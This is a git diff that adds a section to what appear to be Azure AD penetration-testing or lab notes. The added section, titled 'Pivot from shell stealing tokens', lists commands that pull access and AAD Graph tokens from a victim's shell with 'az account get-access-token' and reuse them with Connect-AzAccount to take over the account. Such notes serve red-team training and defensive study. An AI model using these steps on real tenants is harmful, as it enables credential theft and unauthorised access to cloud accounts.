@@ -96,6 +96,26 @@ Get-AzAccessToken -ResourceTypeName MSGraph
 Disconnect-AzAccount
 Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $token -MicrosoftGraphAccessToken eyJ0eXA...
 ```
+
+#### Pivot from shell stealing tokens
+- On victim shell:
+```
+az account get-access-token
+az account get-access-token --resource-type aad-graph
+```
+
+- Open another Powershell console:
+
+PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
+PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
+
+PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
+```
+OR
+```
+Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken
+```
+
 ### Az CLI 
 To retrieve the account ID (also known as the subscription ID) using the Azure Command Line Interface (CLI):
 ```
